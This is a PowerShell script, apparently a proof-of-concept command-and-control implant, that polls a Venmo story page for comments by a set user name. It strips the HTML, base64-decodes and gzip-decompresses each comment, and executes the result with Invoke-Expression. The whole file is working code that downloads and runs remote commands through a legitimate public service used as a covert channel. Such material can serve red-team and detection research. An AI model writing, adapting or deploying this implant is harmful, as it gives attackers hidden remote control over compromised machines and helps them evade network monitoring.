# venmo user name of C2 command poster
$user_name = "<USER NAME>:"

# venmo URI containing C2 commands
$uri_containing_c2_commands = "https://venmo.com/story/<STORY_ID>"

# fetch command and control (C2) commands from URI containing C2 commands
$venmo_web_request = Invoke-RestMethod -Uri $uri_containing_c2_commands

# sanitizing HTML data and figuring out the line with comment
$venmo_web_request_parsed = $venmo_web_request.ToString() -split "[`r`n]" | Select-String $user_name
 
# filter content between all HTML tags
$venmo_html_tags_parsed = $venmo_web_request_parsed -split '<.+?>' -match '\S' #| Select-Object -Skip 1
 
# trim leading and trainling whitespace
$venmo_c2_commands = $venmo_html_tags_parsed.Trim()

# initialize array to hold venmo C2 commands
[System.Collections.ArrayList]$commands_to_be_executed = @()

# look for multiple venmo C2 commands and parse them into separate array
ForEach ($line in $venmo_c2_commands)
{
    # check if commenter's name exists
    if ($line -contains $user_name)
    {
        # ignore commenter's name
        continue
    }
    else
    {
        # gather all venmo C2 commands in a separate array
        # Out-null needed because adding items to array has terminal output
        $commands_to_be_executed.Add($line) | Out-Null
    }
}

# iterate through all venmo C2 commands
ForEach ($base64_encoded_venmo_c2_command in $commands_to_be_executed)
{
    # base64 decode the command in iteration
    $base64_decoded_venmo_c2_command = [System.Convert]::FromBase64String($base64_encoded_venmo_c2_command)

    # create memory stream object
    $memory_stream = New-Object System.IO.MemoryStream
    
    # write the base64 decoded command to memory stream
    $memory_stream.Write($base64_decoded_venmo_c2_command, 0, $base64_decoded_venmo_c2_command.Length)

    # seek the base64 decoded command from memory
    # Out-null needed because adding items to array has terminal output
    $memory_stream.Seek(0,0) | Out-Null

    # create stream reader object
    # decompress the base64 command from memory stream
    $stream_reader = New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($memory_stream, [System.IO.Compression.CompressionMode]::Decompress))
    
    # read the decompressed base64 decoded command till end of stream
    $original_venmo_c2_command = $stream_reader.ReadToEnd()
    
    # execute original venmo C2 command
    Invoke-Expression $original_venmo_c2_command
}